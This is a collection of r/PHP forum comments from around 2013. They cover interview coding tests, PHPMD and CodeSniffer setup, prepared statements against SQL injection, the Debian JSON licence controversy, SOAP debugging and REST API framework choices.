You seem very entitled. No idea where this kind of arrogance in developers these days came from, but I'm glad I never picked it up. Take a giant leap back and try to comprehend exactly how big of a deal it is for a company to offer to pay you to sit around on your ass all day and think. Count yourself lucky that jobs like this even *exist*, let alone that one might be offered to you. And then realize how big of a risk a company is making by giving you a job. You cost a lot of money. Interviews, and the pre-interview tests that often accompany them, are a way for these companies to sift through the chaff. For every one of you (assuming you're even competent), there are dozens of garbage candidates that a company has to vet; most of whom could probably pass a simple Q&amp;A style interview with flying colors. So, get off your high horse and spend the few hours it might take to do a **fun** skill test like this. You aren't a special snowflake.
Sure did, thanks. There was an extra step which I removed.
You didn't actually try to follow this process, since what you've written can't actually work the way you've done it. $ pear channel-discover pear.phpmd.org $ pear channel-discover pear.pdepend.org $ pear install --alldeps phpmd/PHPPMD $ pear install PHPCodeSniffer should actually be: $ pear channel-discover pear.phpmd.org $ pear channel-discover pear.pdepend.org $ pear install --alldeps phpmd/PHP_PMD $ pear install PHP_CodeSniffer
Obviously APC cache is on. Our redis is clustered using twemproxy and our servers are in the same IPblock/area which helps with network latency. I also recommend phpredis https://github.com/nicolasff/phpredis Its written as C bindings which will run faster than some of the other php redis libraries Also writing lean code helps a lot. PHP runs relatively slowly. No way getting around it. So cache as much as you can in Redis (Sets,sortedsets, hashtables are your friend). That way Your not really running a lot of PHP, your just fetching Data. 
from the article: "The industry is now calling this role devops". I've had better experiences where the developers and admins were not separate teams and they worked together instead. In the age where a lot of people are using APIs and offloading jobs with job queues and working with big data (on the backend), I don't believe this is a hard concept to understand.
There's nothing that feels as good as starting a project from scratch. I got excited just reading that. Time to start working on my own unit child classes. I think I'll start with sappers. 
Pointless article. This is just a collection of what he wishes would happen with no actual basis in reality.
For an *actual* look into what PHP will be, check out the [RFC wiki](https://wiki.php.net/rfc). The RFC process has been in operation for a *long* time and it's been used [(with great success)](https://wiki.php.net/rfc#implemented) to determine what features will be implemented in PHP.
Try /r/phphelp or stack overflow. Also, there's not much chance of getting good help with so many details missing. That said, it looks like it's not able to parse the WSDL. Does the WSDL look ok in your browser? If so, is it indeed the location you're pointing to in your implementation?
I certainly did, but my blog has parsed those underscores as markdown. Fixing.
&gt;let's assume $id is already defined and sanitized. the code below is quite basic, but i'd like to know if this query is susceptible to injection or something of the like. Nope, not really. &gt;but i see little use of it in better coders' code. what am i missing? Other coders most likely use parameter binding via prepared statements, which unlike your method which sanitizes against SQL injection, is inherently immune against such an attack. The reason why it's immune is because the statement itself is sent to the DBMS and compiled before any values are sent to it. Instead, you write the SQL with placeholders where you wish to inject the data. Since the SQL query is already compiled down to bytecode, SQL injection is not possible because there no longer exists any SQL to inject into. 
Yes it looks ok in the browser. And i'm positive it is the location. Can you tell me which details you think i'm missing? 
If you're 100% absolutely sure that your data is sanitized, then it's secure. But how sure can you ever really be? Never underestimate the creativity of hackers. The use of bound variables makes your code immune to the attack and there's no reason not to use them. Using bound variables also improves your performance. Your DBMS will save compiled statements for re-use so it doesn't have to compile them again. If you concatenate in your value, the DBMS thinks it's a new query so it'll compile it every time.
got it, so i should be looking into prepared statements. thank you.
Definitely.
Just an FYI for the pear haters out there, all of these are available via composer as well. I put them in a directory that just has a composer.json file and installed my non-per-project dependencies there. Then stuck the /{composer-directory}/vendor/bin in my path. Not perfect, but I prefer it to pear. { "require": { "squizlabs/php_codesniffer": "dev-master", "fabpot/php-cs-fixer": "dev-master", "phpmd/phpmd": "dev-master", "phpunit/phpunit": "3.7.*", "d11wtq/boris": "dev-master" } } 
One could get the same behavior using arrays. I'm learning symfony2 at the moment and they have a lot of that.
I think it's a funny coincide, that exactly today I had time of from regular work and not knowing where to start on refactoring, I downloaded phpmd and started browsing the project. For people using VIM the setup I have takes two steps * just install [syntastic](https://github.com/scrooloose/syntastic) * place this in your vimrc `let g:syntastic_php_checkers=['php', 'phpmd']` Every time you save a file, it will go through `php -l` and run phpmd over it.
Before prepared statements, I didn't use mysql\_real\_escape\_string directly, but rather a function that did that _and_ added the quotes at the ends. So the query ends up like: $q = "UPDATE table SET address=$address WHERE id=$id"; If you ever forget about escaping, your query will happily accept anything as long as it doesn't contain a special character such as a quote. Whereas my method is extremely likely to raise an error, so the bug is easily visible.
It is not mine. But I have overridden FunctionCallSignatureSniff in my private PHPCS to make the token array think multiline arrays, anonymous functions, and strings/concats are just a single line.
Something like this, but it doesn't include the string shrink: /** * Extended function rule to make sure closures/arrays only take a single line */ class FunctionCallSignatureSniff extends \PEAR_Sniffs_Functions_FunctionCallSignatureSniff { public function processMultiLineCall(\PHP_CodeSniffer_File $phpcsFile, $stackPtr, $openBracket, $tokens) { // Must have close if (isset($tokens[$openBracket]['parenthesis_closer'])) { $closeParentheses = $tokens[$openBracket]['parenthesis_closer']; // Go ahead and shrink $this-&gt;shrinkClosuresAndArrays($openBracket, $closeParentheses, $tokens); // If the open and the close are on the same line, we don't process this if ($tokens[$openBracket]['line'] == $tokens[$closeParentheses]['line']) { return; } } // Defer parent::processMultiLineCall($phpcsFile, $stackPtr, $openBracket, $tokens); } /** * Shrinks all closures and arrays and shifts lines after them * * @param int $begin First token pointer (inclusive) * @param int $end Last token pointer (inclusive) * @param (mixed[])[] $tokens Reference to tokens array that is updated */ private function shrinkClosuresAndArrays($begin, $end, array &amp;$tokens) { for ($i = $begin; $i &lt;= $end; $i++) { // Get begin and end of closure or array $itemBegin = null; $itemEnd = null; if ($tokens[$i]['code'] == T_CLOSURE) { $itemBegin = $tokens[$i]['scope_opener']; $itemEnd = $tokens[$i]['scope_closer']; } elseif ($tokens[$i]['code'] == T_OPEN_SHORT_ARRAY) { $itemBegin = $tokens[$i]['bracket_opener']; $itemEnd = $tokens[$i]['bracket_closer']; } else { continue; } // Get line difference $originalLine = $tokens[$itemBegin]['line']; $lineDiff = $tokens[$itemEnd]['line'] - $originalLine; // Must have some difference if ($lineDiff &gt; 0) { // In the closure, put everything on the same line // Outside the closure, shift everything for the line diff for ($j = $itemBegin + 1; $j &lt;= $end; $j++) { if ($j &lt;= $itemEnd) { $tokens[$j]['line'] = $originalLine; } else { $tokens[$j]['line'] -= $lineDiff; } } } } } }
That document is a bit obsolete. People are not fundamentally opposed to named parameters (at least from what I gathered), but it's something that isn't particularly easy to implement (without performance regressions).
I guess you're right, though how do you pass named parameters to nested function calls? I use R a lot it has named parameters. I also has the "..." parameter which is essentially a parameter list of unknown length. Can, among other things, be used to pass named parameters to other functions, but I guess there is an overhead.
Be a bit careful around there though. It's often not immediately clear which of the RFCs are actually active and which are obsolete. Many of those are declined for all practical purposes, just didn't have a vote ;)
I find it hard to believe the same companies which are offloading to queues are picking their frameworks based on how fast it can print out hello world.
ITT: Strong opinions about how no one should ever waste time on company tests because they are beneath all developers and flailing critiques of OP's code. I think it looks good OP - I think fleshed out examples like this do more good as an OOP / UML reference source than text theory in a book.
I use the symfony components and related projects for most of my PHP work. The goal of the post is to show you can gain a lot of performance by tuning a stack. The use of any code in the project is not relevant to the point that I was trying to make. The point that I was trying to make is you should write good code first and use the tools that you are productive in and then go for gains in infrastructure before making micro optimizations.
The run-speed of the framework may not matter much. But that's not what "your framework doesnt matter" means. It means that yes, 1) run time is the important thing and 2) infrastructure is the best place to improve that. The problem is (1) is false. As you demonstrate yourself developer time is extremely expensive. The basic determiner of development time is the pre-existing or intended architecture of your application (, the skill level of the developers involved, etc.). And these things are extremely sensitive to your choice of framework. 
I'd very much recommend you start learning prepared statements too. I found this guide to be really useful when I wanted to learn about prepared statements/PDO for MySQL. http://net.tutsplus.com/tutorials/php/why-you-should-be-using-phps-pdo-for-database-access/
If that's a defence, then it defends any old crap. Brainfuck? Oh stop complaining, as Stroustrup says... The reality of the situation is that there are myopic developers and then are well-read developers. The latter complain and innovate, and the former, cause most of the problems. 
or die($output)
They mostly have stable versions too. I use this for my Jenkins and local installs: "pdepend/pdepend" : "1.1.*", "phpmd/phpmd" : "1.4.*", "phploc/phploc": "*", "phpunit/phpunit": "3.7.*", "squizlabs/php_codesniffer": "1.*", "sebastian/phpcpd": "*", "mayflower/php-codebrowser": "*" Getting these to install globally however (which you will of course need if you want it to work on ANY file, not just in a certain project) is somewhat of a ballache, so I let PEAR do what it does best. You can hate PEAR as much as you like, but it works just fine for doing this.
If servers actually moved fast enough, I could see this causing a big issue.
I'm irrationally angry about this. Especially because the reason for it is so easily fixed.
While this is ridiculous, it doesn't effect anyone as much as you might think. * If you're installing PHP 5.5 on your own server, you can install a PECL. * Most Linux distros are not up to date with the latest versions. * Many have plans to patch this in their own distros. Debian and Fedora I believe have it taken care of, and so does Ubuntu through the only PPA that actually has PHP 5.5 available. It's really fucking stupid and petty, but its not actually a big deal.
Isn't this the kind of stupid fucking bullshit that these licenses are supposed to fix?
So my code "json_encode($evilThings)" won't work now??! SONOFA! I'm switching to an evil language. That's Ruby, right? 
Hi! I'm working on getting a preview chapter up ASAP. I think more high quality e-books are more than $30. http://masteringobjectorientedphp.com/ - $39 http://www.petekeen.net/mastering-modern-payments - $59 (the book + code which is what my book is, and this book is highly specialized) http://doubleyourfreelancingrate.com/ - $49 I'm sure there are other books that are less than $30, but learning what you will with my book + code is easily worth $59 (when published, $44 on pre-sale now). If you're still interested, sign up for the newsletter on the site and I'll announce when there are updates. Thanks!
Is this post actually correct? The JSON source is still in PHP's git repo: https://github.com/php/php-src/tree/master/ext/json and still appears to be part of PHP core. However, it appears that Debian has decided to strip these files from builds they provide via their distributions package manager repository. 
What a petty bunch of bullshit. Makes me rather angry. Grr.
It's not correct, at least for the default PHP distribution; in fact remi says the exact opposite: &gt; Sorry, I don't see us ripping out and rewriting the json code due to this. The blog post makes reference to this being a problem in 5.5rc2, but 5.5 was released with [no mention of JSON removal whatsoever](http://www.php.net/manual/en/migration55.incompatible.php). The blog post really needs to clarify that this is a problem only if you're using the supplied packages from Debian and other like-minded distributions (Ubuntu, maybe Fedora).
No, because not all Open Source licenses are created equal. Open Source generally means the code/developer can be used for any purpose (and most of the different licenses mostly deal with how 'free' the code can be from a philosophical standpoint, which doesn't really come into play in this case). Ideally though, Open Source means that the author cannot dictate how the code is used. Linux distributions normally follow the GPL path since, well, just about everything is GPL. According to the GPL you cannot take away any rights for the software. If you say that a piece of software cannot be used for evil, this goes against the entire idea of the GPL. You've artificially restricted where the code can be used, and that's bad. This is why there are generally BSD and GNU tools that duplicate functionality but in slightly different ways (sed, I'm looking at you). The distribution package maintainers cannot then include this code, so it must be removed. It's not gone from PHP since PHP isn't GPL'd, but restricted code is generally not distributed or officially supported by distributions. 
Alternatively, you could include them in your project as development dependencies: { "require-dev": { "fabpot/php-cs-fixer": "*", "phpmd/phpmd" : "1.4.*", "squizlabs/php_codesniffer": "1.*" } } If you take this route, you can specify [project-specific settings](http://www.soulbroken.co.uk/2013/04/sublime-phpcs-now-supports-project-based-settings/) by creating a new project in Sublime Text. Just add a settings object to your `*.sublime-project` file: { "folders": [ { "follow_symlinks": true, "path": "/path/to/project" } ], "settings": { "phpcs": { "phpcs_executable_path": "/path/to/project/vendor/bin/phpcs", "php_cs_fixer_executable_path": "/path/to/project/vendor/bin/php-cs-fixer", "phpmd_executable_path": "/path/to/project/vendor/bin/phpmd", "phpcs_additional_args": { "--standard": "psr2", "-n": "" }, "phpcs_linter_run": true, "phpcs_show_quick_panel": false, "phpmd_run": true } } } Note however there's [currently a bug with Sublime Text 3](https://github.com/benmatselby/sublime-phpcs/issues/85) where any changes to your project settings file won't be picked up until you either quit out of ST3 or re-save your user settings file. 
A lot of monolithic projects that are designed to "work anywhere" do this so that they can support really, really old versions of php.
It still works. The blog post is wrong. Take 2 seconds to read. Hell, it's talking about RC2 of PHP 5.5, something that's already been released.
wtf
It took me more like 30 seconds to read that post. 
There is already a replacement. http://blog.famillecollet.com/post/2013/06/04/php-pecl-json-1.3.0-en Just install it as a pecl until its rolled in.
When is this/did this get removed from 5.5? Because honestly I'm not going to bother to install a PECL extension -- I'll skip 5.5 entirely and wait for 5.6 (or whatever point-release has it included) or take this opportunity to leave PHP for good. Feels like one step forward two-steps backwards all the time. I understand they didn't create this problem but any release with json support would be ridiculous. 
Some distributions are effected. While upgrading stock ubuntu php 5.4 to 5.5.something I was getting undefined function json_encode() errors, which is why I started Googling for answers and came across this. If you compile from source it's not an issue.
So basically, once again PHP has critical functionality broken - by design - due to ideological or epeen issues.
Hijacking the top comment here for visibility. I've removed this post for now, because I am unable to confirm any ounce of truth in this post, and it has the potential to cause a lot of confusion. It's an extreme rarity that I would remove a post for such a reason, and I hope the community at large will understand my reasoning for doing so. If anyone can provide some clear-cut reference for this being truthful, I'll gladly reverse the removal. I'm consulting with some people in-the-know simultaneously, so we should know either way fairly quickly. Edit: So, it seems like this post is a deliberate misrepresentation of a potential half-truth. The rumour seems to spring from [this Debian bug](http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692613), which seems to indicate that the php5-json package for Debian might ship with a different implementation in the future. Presumably that implementation will have the same API, and will be virtually indistinguishable from the bundled one.
Will do, first thing tomorrow.
Oh I totally agree with you on that! It's nothing wrong with cherrypicking components which suit your needs. I am just against using frameworks as a whole blindly because it appears to speed up development time. I also want to add that another problem with upgrades is if a bug which affects you is only fixed in a major version. If there are no bugs which affect you (or security probs) you definitely should keep your version like it was. The only thing people should be aware of is that the more third party code they use, the more depending on this code they become. (I mean really depending, not programming dependencies) it's a design choice how much responsibility you give away in the hands of zend or symfony. 
As a recent graduate with pretty much zero relevant job experience I got a job based largely off a task. For people who have a less than impressive CVs and aren't anything special in interviews, it is a huge help to be able to show of your ability through something like this. 
Very nice example. Thanks. With providing for default arguments, I now start to wonder why PHP didn't include named arguments at the same time to begin with.
Please do yourself a favor, download SoapUi(Open Source Edition) and use that for testing all WSDL before even starting with client side implementation. SoapUi can spot problems with WSDL, lets you send mock requests and shows all headers/cookies/auth/whatever associated with requests. Extremely handy for debugging/testing SOAP services. [SOAPUI](http://www.soapui.org/)
A better link: https://bugs.php.net/bug.php?id=63520
Seriously, they gonna remove that useful feature for something as harmless as "The Software shall be used for Good, not Evil." ... It seems stupid to me. At least we could wait to have something to replace it, instead of breaking compatibility
Noob question: whats preventing us from using serialized string over json? Could use something like http://phpjs.org/functions/serialize/ for js side.
[copy of my comment from r/programming] Sorry, but this is bullshit. PHP did certainly not drop the JSON extension. PHP is a practical project that does not care much for lawyer masturbation. It *is* true that some Linux distribution switched from json to json-c, but this should be transparent to the user. The standard PHP distribution still ships the JSON extension as it always did. Edit: Regarding Fedora in particular, this is what remi just told me: by Guidelines, all package (webapp or other) which need json extension need to requires php-json which is provided by php-common (php 5.4) or php-pecl-jsonc (php 5.5) so this should be absolutely transparent for the user Edit 2: You should all take this chance to switch to PHP 5.5, so you can see that everything works fine and that PHP 5.5 is awesome :P
You *must not* ever unserialize user provided data. This is a security risk.
Such a mis-leading post title. PHP JSON has been removed from pre-compiled PHP installs on certain distro's - and has been replaced with an alternative module. If this really annoys you - learn to build from source.
Are you an idiot? Using PHP 5.5.1, PHP 5.5.3, compiling from source or using a distribution that has the PECL installed already is pretty simple. If you have a distribution that is not patched already then installing a PECL takes about 5 seconds. You could have installed the PECL while reading this message. Don't be an extremist. 
Remi Collet has re-implemented the json library as a drop-in replacement so there's no licensing issues and no broken code. He's actually improved upon the previous library by introducing JsonIncrementalParser. For fedora users, php-pecl-jsonc is a dependency for php-common, so there's no extra work for you to do when updating or installing php via yum. Sensationalist bullshit title.
Elaborate?
Yes, but using apt-get also means that the repo managers are in total control of the binaries you download and they can do shit like this on a whim.
Best one I know is WHMCS. But it's way more then just ticket system.
Will give it a try later, thx
This was already removed from the front page by moderators for being misleading/wrong. The title has since changed on the article itself for being misleading/wrong. I wrote up an [article](http://philsturgeon.co.uk/blog/2013/08/fud-cracker-php-55-never-lost-json-support) explaining what happened but long story short: nothing has changed except Debian (and maybe Fedora) are switching from ext/json to a different one with a different license which works exactly the same. So, no need to panic. I'm using PHP 5.5 on Ubuntu just fine.
It seems kind of a joke to me. The license doesn't define good/evil, no laws define it so for me it's to the user appreciation. Which means you can use it for whatever you want. (Nobody's gonna sue you because you used that json implementation for "evil", it would be ridiculous in a tribunal)
JSON is universal and every language supports it (at least a basic implementation). PHP serialized data is a data format specific to PHP. I'd suggest always using JSON or XML.
I believe the Dotdeb.org packages still bundle the JSON extension.
You shouldn't tell people what changed in php if you're installing it as a pre compiled binary from a repo. I compiled php5.5 and have been using it for a month at least... I can say without a doubt JSON support is in the php source. 
I see. So JSON beats serialized string in portability and security. Out of curiousity, is there a way to "dumb" down the serialized string for it to behave like json (no __wakeup or __destruct just array of data)? 
Douglas Crockford can be such a child sometimes, despite his old age. &gt;On Wed, Nov 14, 2012 at 10:06 PM, Douglas Crockford &lt;douglas@crockford.com&gt; wrote: &gt;&gt; The license looks fine to me. &gt;So he refuses politely... which means it's time for PHP.net to think about this license issue (e.g. use a different implementation for JSON).
+1 on the prepared statements. Validating something as free form as an address is probably not worth the effort unless you have a very specific format they're supposed to use. Remember, the point of validation isn't to try to guess what the user means, it's to force them to give you what you want. If you use something like filter_var with the sanitize filters, be careful with what you're getting back.
&gt;Remember, the point of validation isn't to try to guess what the user means, it's to force them to give you what you want. To be fair, you should give them some degree of freedom. For instance, if you have a field for credit card numbers, it shouldn't matter if you type in the credit card numbers as plain digits, or if you group the numbers with spaces like it's displayed on the credit card. You should strip out anything which isn't digits, then you should proceed to validate whatever is left. 
Well, in the post it only looks like very general calls with no configuration. $services and $parameters are unknown. Also, in the error, address.com:8080 looks like a placeholder to me, not the actual service. As mrafaeldie12 mentioned, the full code would certainly give better guidance for help. deadman87 also has good advice in testing the service, to narrow down if it's an implementation issue or not.
Thanks for the clarification. We all get confused sometimes - even Über contributors to this community such as yourself. And yeah 5.5 is the business.
Ha! Thanks. I try to own my mistakes. Its embarrassing, but it makes them happen less. The last time I had to do a "I fucked up" article was the Puppet v Chef article where I got about 50% of the article wrong. Not fun at all.
No, I want shit to continue to work (thankfully, this was never a real issues). I deploy to some machines I have control over and some machines that I don't. I develop on several Windows machines. So PECL is not some universal solution. 
Unfortunately, titles are the whole article for a great many people.
Thank you. I just have a questiong first, will this work (the testing, in client side) if I am not owner of the webservice? The webservice is provided by another company.
Yes inside the box! Biggest problem with software today is that its designed by developers way to often. 
Yes ofcourse. Just load the WSDL from file or a URL. It will analyze the whole WSDL document, create sample request SOAP envelopes for methods on the webservice.
When I started writing this article the "previous article" was a different link to what it is now. Looking at the thread for that conversation, it was clear people had not come to this conclusion. While writing it, the link to that article was pulled off /r/php main page by a moderator. Then another one was posted and responses from many more people came in, this time people were pointing out the flaws, but some were still confused. The original author changed the name of his article too which helped, but that didn't solve the problem for people who had already read it. Lots of things changed in a short period of time, and while some people know what is going on it would be unrealistic to use the word "everyone".
As you say luckily this was not an issue, but continuing under the pretense that it was, your response is still bizarre. If you control the box (as you do with some of them), you can install a PECL. So that's half of your job done. The weird part: You don't have control over machines that are running PHP 5.5.2? Somebody upgraded a box out of your control to PHP 5.5.2, and didn't notice things break, breaks your entire application and refuses to roll back to 5.5.1 or install a PECL? I don't see how either of those scenarios would ever happen. But, luckily its not an issue.
Well, this certainly makes more sense than the thought that they removed json support.
Today or tomorrow hopefully. It's already written for the most part, just needs polish.
I wouldn't go as far as saying it's the biggest problem. When handed a fully fleshed out specification with diagrams, rules and details from top to bottom, even a housewife with an online course could code the thing. The point wasn't to produce a new transportation system or a way to ensure world peace, it was to display good coding discipline and problem solving skills. That's the only purpose of this task, which is why it's perfectly fine to have it designed by the developer.
I didn't fully believe it until I saw your reddit reply about it -- I figured if Phil Sturgeon is up in arms about it then it must be true! Oops! It didn't make it to hacker news so all is well. :) 
4-5 years of real world experience. Making 71k plus a 7k signing bonus. Salary bumped to 81k in 6 months. Also got stake in the company (its a start-up in DC) Title: Senior Software Engineer Background: Pretty much can pick up any language really quickly. Actually learning php for the first week, was recently coding a few side projects in node. Going to attempt to convert our site to node as a side project. 
posted full code
posted full code
posted full code
I disagree about the houswife :) A specification should map out exactly _what_ needs to be done and not _how_.
The second I saw JSON, I *knew* that this would be the evil license. So much man hours have been wasted because of it.
Well, a good thing they added that "The Software shall be used for Good, not Evil." line. Imagine all the evil that could've been done with this extension. Luckily that's all prevented now, it was certainly worth all this trouble.
Get out of the burbs. Jobs in the city make 80k to 110k.
Free version should be enough.
As interim workaround for incomplete packages (though that's only useful for development), there are userland implementations of `json_encode/_decode()`, for example in [upgradephp](http://include-once.org/p/upgradephp).
There's nothing wrong with the .ini format if it meets your needs. If you anticipate ever needing more than simple key/value configuration, I'd suggest YAML or JSON instead, though.
I think that license must have been written purely so that big companies have to come to you and say "We want to use this software for evil".
Thanks for getting back to me /u/drrcknlsn I'm going to look into YAML. I am familiar with JSON, but not in the the context of configuration. 
I'm in the same boat, but I didn't jump onto it until PHP 3.
&gt; I'm not sure r+ will create the file if it does not exist The `fopen()` page tells you which switches actually create a file if one doesn't already exist. Just to test, I tried a quick script (php 5.4 windows) with a fake filename and PHP gave a warning saying the file doesn't exist. I checked the directory I passed in to make sure a file wasn't actually created, and it wasn't. It should be safe to say r+ won't create a file. 
fl to the ock, yo
This isn't a Mac-specific question. 1. Traverse the document with arrow keys. Or simply click where you want the cursor to be. 2. Autocomplete functionality depends on which editor you're using. With Sublime Text 2, you can just type `div`, hit TAB, and it will expand it for you. I think PHPStorm also uses the TAB key for autocomplete. 
I'm in the process of trying out phpstorm at the moment, I'm using the plugin IdeaVim, which gives you most of the basic vim movements, commands, etc.
Hi, I was rather hoping for a more efficient way than tapping away on the arrow keys or reaching for the mouse :( Point 2 is less important than my DOM traversal query above, if I for example type "&lt;div cla" and press tab, the software completes to "&lt;div class=' '&gt; with the cursor waiting for me to enter a class name. But what do I do after I have entered a classname? If I hit tab it merely inserts a tab into the class name "&lt;div class=' '&gt;". 
You are talking about a preference of PhpStorm (based on Intellij). Check out [this link](https://www.google.com/search?q=phpstorm+caret). The first result on google will direct you to what you wanted. You can also, using a keyboard mapping, map the autocomplete to a key combination so you can load it up when you want. Hope it helps
Unfortunately, arrow keys or mouse are your options unless you're using Vim (or something like [Sublime Text 2 in vintage mode](http://www.sublimetext.com/docs/2/vintage.html)). It sounds like you want to generate some markup, and step through the markup to add content. For this, try using the [Emmet plugin](http://emmet.io/). 
I did Google around for around an hour, but did not use the word 'caret'. Thanks for the help ;)
a) CTRL + left/right and home/end is your friend b) Use and abuse Settings-&gt;Keymap, there's a *Move Caret to Code Block Start/End* which jumps to end/beginning of tag declaration and code blocks c) there's an IdeaVim plugin too
Php.net Google.com Seriously. If you can ask the question... One of those two will answer it! There are so many free resources in the form of one off blog posts that you really can't pin point too many of them. PHP is a broad world. Dev shed is always really good for direct tutorials / conceptual idea articles. 
Hi. Always write due date and sent date in database. Because script might fail and cron might die so written information is your best solution. Then you should divide your test in two categories: unit and integration. Unit test will check your function for sending mails and integration test will check your ability to get data from database. Then you can pass time argument to query and retrieve records to send. Best regards
Basic suggestion: seperate logic (PHP) and display (HTML). A very good practice is to use a template-engine for this, I myself always use [smarty](http://www.smarty.net/) So you would write one file with PHP and one file with HTML, the template. And then assign variables in PHP and call the template and be done with it. Both aspects gain from this behaviour.
It's a common knowledge that Wordpress is a steaming pile of shit. 
i don't agree with the last one. he can have wordpress, but also make his code good. \*turning face towards op\* i suggest, you function returns and object, or and array of data and in the html code, you echo the values like this: &lt;?=$object-&gt;attribute;?&gt; or &lt;?=array['key'];?&gt; when you have a block of html that you want to repeat a lot (like a list of users), you can do this: &lt;?php for($i...) { ?&gt; &lt;div&gt; your html block and maybe some of this: &lt;?=$array[$i];?&gt; &lt;/div&gt; &lt;?php } ?&gt; i really like the **&lt;?=** sytax. it's smaller than **&lt;?php echo x**.
most of the "tests" i've been given have been really simple stuff like "query a database and return books and authors" type of thing. The most difficult one was "design an elevator system" (which I believe is quite common in the java community)
I don't know, php is already a templating language. Just separate logic from your views and echo variables in the views.
Emmet is also built right into PHPStorm
Facepalm!
Oh, I agree that it's possible. It's just kind of... pointless. If you care about standards and best practises *don't use wordpress*. Caring about it while clearly not caring about it... I don't really get that. &lt;?= Yeah, I'm not a fan. I **know** it's technically allowed, but I avoid short tags in all of their forms. also... &lt;?php for($i...) { ?&gt; &lt;?=$array[$i]?&gt; &lt;?php } ?&gt; I... can't help thinking you're going to be doing something reeeeal dumb there? If you're doing what I think you're doing.
What's wrong with something like this? http://codeangel.org/articles/simple-php-template-engine.html
Thank you, I had been thinking of it as a object factory pattern as it has a setter and getter for the model. But having looked at those links it makes sense now. I think the Apprentice to Artisan is the only Laravel ebook I dont have yet - waiting for pay day to buy it.
1. There's a couple of ways to access an api, but you'll probably just want to return a JSON file at your endpoints. How you load the website will be up to your discretion, but I usually build out the api to work on the frontend, and mobile side. For the actual site, I'll load in all my data via AJAX (javascript mvc is usually a good idea for larger stuff). 2. CodeIgniter and Laravel are my go to frameworks depending on the requirements of the project. Laravel has a lot more 'rules' that need to be followed to take full advantage of the platform, increasing the learning curve. Some CI references to pull ideas from (or even use in your project) http://net.tutsplus.com/tutorials/php/working-with-restful-services-in-codeigniter-2/ https://github.com/philsturgeon/codeigniter-restserver https://github.com/jamierumbelow/codeigniter-base-model 3. MySQL should be fine to get the ball rolling (PostgreSQL might be worth doing some research on, but I'm a MySQL guy personally). You should be able to get Redis into your stack pretty easily once you start having server problems. Overall, my suggestion would be to plan out your api carefully as a spec. Think about your validation (both user auth and data (pki like HMAC, sessions, etc?)), think about what data you do and don't want to be accessible (id's, soft deletion, password hashes, timestamps, etc.). Hope this helps
I also like Laravel. It's a good way to make "stuff" and it automatically outputs json, which makes it ideal for api creation. The learning process is well worth it just for the overall productivity and general usefulness. If you don't want to make the jump to a full framework you could consider a microframework. That's what I did. Helped to dip my toe into the concept of things like routing, facades, etc. I used Flight, but Silex is probably a better choice. That said, I would recommend jumping in the deep end and laravellating. It's made me enjoy PHP again. I'm learning more now than I have in a very long time. At the very least, make sure you're using Composer. The best way to access the API... From your mobile thingy I don't really know. From your website... just use ajax. Make your api properly restful, and use ajax calls to pull in json, throw it in a template and bob's your uncle. If you want hosting that will scale, look at cloud based PaaS platforms. I use FortRabbit, and it has excellent support for Laravel. You can start up a project for free while you develop it, and then pay later when traffic ramps up. If volume gets to a point where a VPS or dedicated server is an option/requirement you can worry about it then. But in the meantime you can have hosting for free or nearly free. 
1. You can use [Postman](https://chrome.google.com/webstore/detail/postman-rest-client/fdmmgilgnpjigdojojpjoooidkmcomcm?hl=en) or something similar to build up a "Collection" for use during development. 2. You can build a RESTful API with any modern framework, such as Silex, Slim, Laravel 4, SF2, etc, none of them make a difference. Make sure the routing system allows for you to list GET/POST/PUT/DELETE differently (so, not CodeIgniter) and you're pretty much set from there. 3. There is nothing wrong with MySQL as your datastore. I was hanging out with one of the Seatgeek developers the other day and they're turning out a LOT of traffic. They just finished switching a bunch of their datastore from Mongo to MySQL, and they're very happy about it. Postgres is another nice option, but neither are a silver bullet to performance. Nginx is nice, but it has to be configured just right or you'll actually find yourself having problems at low-to-medium traffic. Read [Scaling PHP](https://www.scalingphpbook.com/) for more help on these topics.
After spending a long time trying to force quality RESTful API functionality into CodeIgniter I'd advice against it. Most modern frameworks handle it all so much better - especially L4. I've replaced a few CI APIs with L4 now and its SO much smoother.
yes, more constructive. you're slowly getting there, but when i look at your code, i see that you just changed the type of loop from for to foreach. i belive, anyone can do that. also, there are some performance concerns, i have with the foreach. yes, it is easier to read, but is it faster in every case? i used "for($i...)" just to hint, that we're gonna loop through something with some kind of loop, to shorten my example a bit.
Thank you for your reply, one quick followup question. I was originally thinking of using AJAX to handle all of the API calls, but logistically, I am having a couple of mental hangups. 1) Rate limiting, the actual website itself will not be rate limited, but if I want any external API access to have a limit, how do I differentiate between the two? 2) Private API calls. Say there is an API call I only want my platform to perform and not be publicly accessible, anyone could just look at the javascript and see URL to the hidden API function and then have access to it. Any way of preventing this? Again, I really appreciate your help, thanks for your reply!
Thank you for your reply, one quick followup question. I was originally thinking of using AJAX to handle all of the API calls, but logistically, I am having a couple of mental hangups. 1) Rate limiting, the actual website itself will not be rate limited, but if I want any external API access to have a limit, how do I differentiate between the two? 2) Private API calls. Say there is an API call I only want my platform to perform and not be publicly accessible, anyone could just look at the javascript and see URL to the hidden API function and then have access to it. Any way of preventing this? Again, I really appreciate your help, thanks for your reply!
Yes. Changing the loop was the point of my change. And yes. It's better to use foreach. If not strictly always then 99.999% of the time. 
There are plenty of ways to block access, including sending a hash with your data. This is a common solution I can detail if you're interested but it will have to wait until later because its 3am and I must sleep. Other options are oauth and basic authentication. 
Looks like pretty positive changes. I'm sure some people will complain, because people hate change. The overly verbose folder names has definitely been an annoyance. I'd also love to see Twig and similar libraries transition to namespaces. 
What do component developers have to change in their composer.json ?
How would I display conditional html without the php showing it then? For my example I needed certain divs to show up at different points. When I add new users, the html layout is a little different. since I don't have a solid "template", so how would I create a dynamic one like mine, but better? Thanks!
I care about the code **I** write. It doesn't matter where it ends up but if I've done my best then it's something I can be proud of. And it's not as if WordPress developers are bad and don't know it. Their success is their limiting factor. Matt has said he would like to completely redo the code but when you run a significant portion of the internet you have to consider backwards compatibility.
